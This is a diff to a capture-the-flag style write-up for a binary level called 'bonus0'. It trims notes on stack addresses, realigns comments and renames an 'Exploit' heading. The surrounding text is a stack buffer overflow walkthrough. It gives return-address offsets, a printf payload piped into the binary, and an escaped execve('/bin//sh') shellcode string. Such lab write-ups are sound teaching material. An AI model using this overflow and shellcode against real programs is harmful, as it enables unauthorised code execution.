@@ -91,12 +91,6 @@ Its stack frame should resemble something like this:
       LOWER MEMORY ADDRESSES      
 ```
 
-> Addresses above are the real values observed under `env -i ./bonus0` (ASLR off).
-> The `buffer` starts at `0xbfffedc0`, so the shellcode injected past the 20 copied
-> bytes lands at `0xbfffedc0 + 20 = 0xbfffedd4` — the address we return to.
-> (Under `gdb` the whole stack sits ~`0x20` lower, because `gdb` launches the target
-> through a shell that re-adds a few environment variables.)
-
 Let's continue with the `pp()` function's memory layout as it is where the stack overflow starts.
 Its stack frame should resemble something like this:
 ```ruby
@@ -163,11 +157,6 @@ Since `pp()` writes directly to the pointer passed by `main()`, the buffer overf
       LOWER MEMORY ADDRESSES      
 ```
 
-> `buffer` starts at `0xbffffe46`. The saved `EBP` sits 50 bytes above it
-> (`46`-byte buffer + `4`-byte alignment, at `0xbffffe78`) and the saved return
-> address 54 bytes above it (at `0xbffffe7c`) — hence the "overwrite from byte 50 / 54"
-> figures below.
-
 ### Intent
 
 On this binary, a lot of security features are missing:
@@ -193,8 +182,8 @@ Assuming a buffer overflow:
 - `main()`'s buffer allows us to overwrite the **caller's stack base pointer *(4 bytes)*** from its 50th byte. 
 - `main()`'s buffer allows us to overwrite the **main()'s return address *(4 bytes)*** from its 54th byte. 
 ```sh
-malicious_return_address='\220\220\220\220'; # per example: 4 NOP bytes.
-up_to_4075_more_bytes='...'; # Arbitrary amount of bytes. Can be 0.
+malicious_return_address='\220\220\220\220';    # per example: 4 NOP bytes.
+up_to_4075_more_bytes='...';                    # Arbitrary amount of bytes. Can be 0.
 $ (printf '%b\n' 'AAAAAAAAAAAAAAAAAAAA'; sleep 1.0; printf '%b\n' "BBBBBBBBB${malicious_return_address}BBBBBBB${up_to_4075_more_bytes}") | env -i ./bonus0
  - 
  - 
@@ -253,7 +242,7 @@ The shellcode therefore starts at `buffer (0xbfffedc0) + 20 (0x14)` during the *
 This address is written at bytes 9-12 of the second input, so that once the overflow walks through the two contiguous buffers it overwrites `main()`'s saved return address with it.
 
 
-### Exploit
+### Result
 
 ```sh
 shellcode=$(generate_shellcode);    # '\061\300\120\150\156\057\163\150\150\057\057\142\151\211\343\120\123\211\341\061\322\260\013\315\200'
